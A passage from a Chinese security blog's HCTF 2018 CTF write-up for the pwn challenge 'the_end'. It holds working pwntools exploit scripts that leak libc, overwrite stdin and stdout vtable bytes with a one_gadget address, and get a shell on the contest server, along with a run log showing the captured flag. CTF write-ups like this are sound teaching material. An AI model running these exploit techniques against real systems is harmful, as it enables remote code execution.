+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/pwn/hctf/the_end_dir$ python solve.py </span><br><span class="line">is_debug:0</span><br><span class="line">[+] Opening connection to 150.109.44.250 on port 20002: Done</span><br><span class="line">[*] &apos;/home/qianfa/Desktop/pwn/hctf/the_end_dir/libc64.so&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">0x7fb2ccd1b230</span><br><span class="line">0x7fb2ccc4f000</span><br><span class="line">0x7fb2ccd3f2a4</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag &gt;&amp;0</span><br><span class="line">hctf&#123;a53783c526bf3756a983a2e5af0e1f980393b7b69b0dfd68d578e937e342d212&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h3><p>修改stdin-&gt;vtable</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.endian = &quot;little&quot;</span><br><span class="line">context.os = &quot;linux&quot;</span><br><span class="line">context.arch = &quot;amd64&quot;  #i386</span><br><span class="line">context.word_size = 64   #32</span><br><span class="line">context.log_level = &quot;debug&quot; #info, warn, critical</span><br><span class="line"></span><br><span class="line">global io</span><br><span class="line">binary = &quot;./the_end&quot;</span><br><span class="line"></span><br><span class="line">def write4(date):</span><br><span class="line">    for one in data:</span><br><span class="line">        io.send(p64(one[0]))</span><br><span class="line">        io.send(chr(one[1]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#0x00007f436cc2d6e0 stdin-&gt;vtable</span><br><span class="line">#0x00007f436cc2e3e0 a pointer --&gt; one byte</span><br><span class="line">#0x00007f436cc2e400 0x00007f436c9f67e9 </span><br><span class="line">#                   0x00007f436c95a2a4 one_gadget --&gt; 3 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">stdin-&gt;vtable  0x00007fa1e55679b8  0x00007fa1e55666e0</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    pipe_argv = [binary,&quot;&quot;]</span><br><span class="line">    pipe_env = &#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;</span><br><span class="line">    #io = process(pipe_argv, env=pipe_env)</span><br><span class="line">    io = remote(&quot;150.109.46.159&quot;,20002)</span><br><span class="line">    io.readuntil(&quot;Input your token:&quot;)</span><br><span class="line">    io.sendline(&quot;Ooh0jQajnHvoGq2lTlMt9tkT0EkellEa&quot;)</span><br><span class="line">    io.readuntil(&quot;here is a gift &quot;)</span><br><span class="line">    libc_sleep = int(io.readuntil(&quot;,&quot;)[2:-1], 16)</span><br><span class="line">    libc_base = libc_sleep - libc.symbols[&quot;sleep&quot;]</span><br><span class="line">    log.info(&quot;libc_base--&gt;&#123;&#125;&quot;.format(hex(libc_base)))</span><br><span class="line">    one_gadget = 0xf02a4 + libc_base</span><br><span class="line">    log.info(hex(one_gadget))</span><br><span class="line">    stdin_vtable = 0x3c49b8 + libc_base</span><br><span class="line">    io.readline()</span><br><span class="line">    data = []</span><br><span class="line">    </span><br><span class="line">    data.append([libc_base + 0x3c4bf8 + 0, ((one_gadget) &gt;&gt; 0) &amp; 0xff])</span><br><span class="line">    data.append([libc_base + 0x3c4bf8 + 1, ((one_gadget) &gt;&gt; 8) &amp; 0xff])</span><br><span class="line">    data.append([libc_base + 0x3c4bf8 + 2, ((one_gadget) &gt;&gt; 16) &amp; 0xff])</span><br><span class="line">    data.append([libc_base + 0x3c49b8 + 1, ((0x3c4be0 + libc_base) &gt;&gt; 8) &amp; 0xff])</span><br><span class="line">    pause()</span><br><span class="line">    write4(data)</span><br><span class="line">    io.interactive()</span><br><span class="line">    &apos;&apos;&apos;enter&apos;&apos;&apos;</span><br><span class="line">    &apos;&apos;&apos;enter&apos;&apos;&apos;</span><br><span class="line">    &apos;&apos;&apos;exec 1&gt;&amp;0&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>方法三:</p>
+<p>修改stdout-&gt;vtable</p>
+<p>服务器上<code>libc</code>的版本是<code>2.24</code>，在2.24的libc源码中对<code>io_file</code>的<code>vtable</code>进行了<code>IO_vtable_check</code>,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line"># https://github.com/matrix1001/welpwn</span><br><span class="line">if os.path.exists(&apos;./welpwn&apos;) != True:</span><br><span class="line">    print(&quot;Verify that welpwn is in the current directory&quot;)</span><br><span class="line">    exit()</span><br><span class="line">sys.path.insert(0,os.getcwd()+&apos;/welpwn&apos;)</span><br><span class="line">from PwnContext.core import *</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    #context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line"></span><br><span class="line">    #-----function for quick script-----#</span><br><span class="line">    s       = lambda data               :ctx.send(str(data))        #in case that data is a int</span><br><span class="line">    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">    st      = lambda delim,data         :ctx.sendthen(str(delim), str(data)) </span><br><span class="line">    sl      = lambda data               :ctx.sendline(str(data)) </span><br><span class="line">    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))</span><br><span class="line">    r       = lambda numb=4096          :ctx.recv(numb)</span><br><span class="line">    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)</span><br><span class="line">    irt     = lambda                    :ctx.interactive()</span><br><span class="line"></span><br><span class="line">    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">    leak    = lambda address, count=0   :ctx.leak(address, count)</span><br><span class="line"></span><br><span class="line">    uu32    = lambda data   :u32(data.ljust(4, &apos;\0&apos;))</span><br><span class="line">    uu64    = lambda data   :u64(data.ljust(8, &apos;\0&apos;))</span><br><span class="line"></span><br><span class="line">    def to_write(addr,val):</span><br><span class="line">        s(p64(addr))</span><br><span class="line">        sleep(0.1)</span><br><span class="line">        s(p8(val))</span><br><span class="line"></span><br><span class="line">    debugg = 0</span><br><span class="line">    logg = 0</span><br><span class="line"></span><br><span class="line">    ctx.binary = &apos;./the_end&apos;</span><br><span class="line">    #ctx.remote_libc = &apos;/vm_share/libc64.so&apos;  # /glibc/2.24/lib/libc-2.24.so</span><br><span class="line">    #ctx.debug_remote_libc = True # this is by default</span><br><span class="line">    ctx.remote = (&apos;150.109.46.159&apos;, 20002)</span><br><span class="line"></span><br><span class="line">    #ctx.bases.libc</span><br><span class="line">    #ctx.symbols = &#123;&apos;sym1&apos;:0x1234, &apos;sym2&apos;:0x5678&#125;</span><br><span class="line">    #ctx.breakpoints = [0x964]</span><br><span class="line">    #ctx.debug()</span><br><span class="line"></span><br><span class="line">    if debugg:</span><br><span class="line">        rs()</span><br><span class="line">    else:</span><br><span class="line">        rs(method = &apos;remote&apos;)</span><br><span class="line">        sla(&apos;token:&apos;,&apos;DN2WQ9iOvvAGyRxDC4KweQ2L9hAlhr6j&apos;)</span><br><span class="line"></span><br><span class="line">    if logg:</span><br><span class="line">        context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">    ru(&apos;gift &apos;)</span><br><span class="line">    libc_base = int(ru(&apos;,&apos;),16) - 0xcc230</span><br><span class="line">    log.success(&quot;libc_base = %s&quot;%hex(libc_base))</span><br><span class="line"></span><br><span class="line">    tls = libc_base + 0x5d5700</span><br><span class="line">    log.success(&quot;tls = %s&quot;%hex(tls))</span><br><span class="line"></span><br><span class="line">    one = libc_base + 0xf02a4</span><br><span class="line">    log.success(&quot;one = %s&quot;%hex(one))</span><br><span class="line">    vtable = libc_base + 0x3c56f8</span><br><span class="line">    log.success(&quot;vtable = %s&quot;%hex(vtable))</span><br><span class="line">    io_stdout = libc_base + 0x3c5620</span><br><span class="line">    log.success(&quot;io_stdout = %s&quot;%hex(io_stdout))</span><br><span class="line">    target = libc_base + 0x3c44e0 + 0x18</span><br><span class="line">    log.success(&quot;target = %s&quot;%hex(target))</span><br><span class="line"></span><br><span class="line">    to_write(target,one&amp;0xff)</span><br><span class="line">    to_write(target+1,(one&gt;&gt;8)&amp;0xff)</span><br><span class="line">    to_write(target+2,(one&gt;&gt;16)&amp;0xff)</span><br><span class="line">    to_write(vtable+1,(target&gt;&gt;8)&amp;0xff)</span><br><span class="line">    to_write(io_stdout+0x28,0xff)</span><br><span class="line"></span><br><span class="line">    irt()</span><br></pre></td></tr></table></figure>
+<h2 id="baby-printf2"><a href="#baby-printf2" class="headerlink" title="baby_printf2"></a>baby_printf2</h2><p>stdout地址可控，可以通过伪造<code>__IO_STDOUT_2_1_</code>实现任意地址写，任意地址读。</p>
+<h2 id="heapstorm"><a href="#heapstorm" class="headerlink" title="heapstorm"></a>heapstorm</h2>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/49484/">https://www.tiandiwuji.top/posts/49484/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/49484/">November 11th 2018, 9:17:44 pm</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/62306/" title="babystack-ret2dlsolve">
+                    <div class="nextTitle">babystack-ret2dlsolve</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/59104/" title="SROP-study">
+                    <div class="prevTitle">SROP-study</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup"><span class="toc-number">1.1.</span> <span class="toc-text">warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#admin"><span class="toc-number">1.2.</span> <span class="toc-text">admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方法1"><span class="toc-number">1.2.1.</span> <span class="toc-text">方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法二"><span class="toc-number">1.2.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kzone"><span class="toc-number">1.3.</span> <span class="toc-text">Kzone</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方法一（Ricterz）"><span class="toc-number">1.3.1.</span> <span class="toc-text">方法一（Ricterz）:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法二-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hide-and-seek"><span class="toc-number">1.4.</span> <span class="toc-text">hide and seek</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bottle"><span class="toc-number">1.5.</span> <span class="toc-text">bottle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#game"><span class="toc-number">1.6.</span> <span class="toc-text">game</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">2.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#the-end"><span class="toc-number">2.1.</span> <span class="toc-text">the_end</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方法1-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法二-2"><span class="toc-number">2.1.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-printf2"><span class="toc-number">2.2.</span> <span class="toc-text">baby_printf2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heapstorm"><span class="toc-number">2.3.</span> <span class="toc-text">heapstorm</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 71
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/31116/">ctf题目-php调试分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/36891/">php7.2内核调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href="/posts/46756/">linux-优化实战笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/posts/41159/">RealWorldFinal</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href="/posts/4968/">pwnable.tw练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href="/posts/48844/">bctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/23961/">安全域划分的相关问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/posts/16617/">code-breaking</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/posts/3376/">lctf-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href="/posts/62306/">babystack-ret2dlsolve</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/posts/49484/">hctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href="/posts/59104/">SROP-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/posts/49989/">hitcon-复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/30021/">hack-lu</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href="/posts/56316/">netty入门到精通-初识NIO</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/61088/">php-项目结构</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/11284/">jvm-java虚拟机如何运行java字节码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/1345/">pwnable.kr_刷刷刷</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/62824/">dubbo项目结构</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/28842/">zookeeper安装-启动</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/11234/">dubbo-启动</a>
+        </li>
+    
+    
